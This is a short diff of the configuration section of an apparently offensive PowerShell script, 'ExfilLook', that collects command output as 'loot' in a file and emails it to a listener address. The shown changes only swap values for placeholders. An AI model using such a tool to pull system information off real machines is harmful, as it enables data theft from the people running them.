@@ -15,14 +15,14 @@ __         __   ____   _        ___      __     ____     ______      _____      
 # The email to send the loot to
 $listenerEmail = "EMAIL"
 
-$emailSubject = "ExfilLook"
-$emailBody = "Proof of Concept"
+$emailSubject = "SUBJECT"
+$emailBody = "BODY"
 
 # The full path for the file that'll contain the loot
-$filePath = "./loot234289763972623.txt" 
+$filePath = "./FILENAME.txt" 
 
 # The commands to fetch the desired information
-$command = whoami # CHANGE IF NEEDED
+$command = Write-Host "tmp"
 
 # ---------------------------------------------------------------------------------- #
 # Step 2: Test to see if the required processes are enabled on the machine           #
